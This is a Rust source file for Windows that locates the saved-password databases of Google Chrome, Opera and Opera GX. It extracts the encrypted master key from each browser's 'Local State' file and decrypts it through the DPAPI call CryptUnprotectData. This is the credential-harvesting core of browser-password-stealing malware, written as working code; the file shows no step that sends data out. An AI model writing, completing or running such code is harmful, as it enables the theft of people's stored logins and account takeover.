use anyhow::Result;
use base64::{engine::general_purpose, Engine};
use serde_json::Value;
use std::{fmt, fs, path::Path, ptr::null_mut, slice};
use whoami::username;
use windows::Win32::{
    Foundation::HLOCAL,
    Security::Cryptography::{CryptUnprotectData, CRYPT_INTEGER_BLOB},
    System::Memory::LocalFree,
};

#[derive(Clone, Copy)]
pub enum ChromiumBrowser {
    GoogleChrome,
    Opera,
    OperaGX,
}

impl fmt::Display for ChromiumBrowser {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match *self {
            Self::GoogleChrome => write!(f, "Google Chrome"),
            Self::Opera => write!(f, "Opera"),
            Self::OperaGX => write!(f, "Opera GX"),
        }
    }
}

/* */
pub struct Chromium {
    pub browser: ChromiumBrowser,
    pub base_path: String, // path to appdata depending on browser
}

impl Chromium {
    pub fn new(browser: ChromiumBrowser) -> Self {
        // Get username for appdata path
        let username = username();
        let path: String;

        // Set browser specific path
        match browser {
            ChromiumBrowser::GoogleChrome => {
                path = format!(
                    "C:\\Users\\{}\\AppData\\Local\\Google\\Chrome\\User data", 
                    username
                );
            }
            ChromiumBrowser::Opera => {
                path = format!(
                    "C:\\Users\\{}\\AppData\\Roaming\\Opera Software\\Opera Stable",
                    username
                );
            }
            ChromiumBrowser::OperaGX => {
                path = format!(
                    "C:\\Users\\{}\\AppData\\Roaming\\Opera Software\\Opera GX Stable",
                    username
                );
            }
        };

        Chromium {
            browser: browser,
            base_path: path,
        }
    }

    /// See if path exists, true if it does, else false
    pub fn check_path(&self) -> bool {
        Path::new(&self.base_path).exists()
    }

    pub fn get_db_file(&self) -> String {
        let db_path: String;

        match self.browser {
            ChromiumBrowser::GoogleChrome => db_path = "Default\\Login Data".to_string(),
            ChromiumBrowser::Opera => db_path = "Login Data".to_string(),
            ChromiumBrowser::OperaGX => db_path = "Login Data".to_string(),
        }

        format!("{}\\{}", self.base_path, db_path)
    }

    pub fn get_master_key(&self) -> Result<Vec<u8>> {
        // Masterkey file
        let file = format!("{}\\Local State", self.base_path);
        let file = Path::new(&file);

        // Read file, parse json
        let contents = fs::read_to_string(&file)?;
        let formatted: Value = serde_json::from_str(&contents)?;

        // Get key from json
        let key = formatted
            .get("os_crypt")
            .and_then(|val| val.get("encrypted_key"))
            .unwrap();

        // Base64 decode
        let mut out = general_purpose::STANDARD.decode(key.as_str().unwrap())?;

        // Call WindowsAPI -> CryptUnprotectData
        // To decrypt the key
        // Skipping the DPAPI prefix
        let out = self.unprotect(&mut out[5..])?;

        return Ok(out);
    }

    fn unprotect(&self, data: &mut [u8]) -> windows::core::Result<Vec<u8>> {
        let data_in = CRYPT_INTEGER_BLOB {
            cbData: data.len() as u32,
            pbData: data.as_mut_ptr(),
        };
        let mut data_out = CRYPT_INTEGER_BLOB {
            cbData: 0,
            pbData: null_mut(),
        };

        unsafe {
            // writes to data_out
            CryptUnprotectData(
                &data_in, None, None, None, None, 0, &mut data_out
            ).ok()?;

            // Convert output to Vec<u8> "bytes"
            let bytes = slice::from_raw_parts(data_out.pbData, data_out.cbData as usize).to_vec();

            // Free up used blob data
            let _ = LocalFree(HLOCAL(data_out.pbData as isize));
            // if result != Ok(HLOCAL(0)) { println!("Failed to free blob data - err code {:?}", result); }

            Ok(bytes)
        }
    }
}
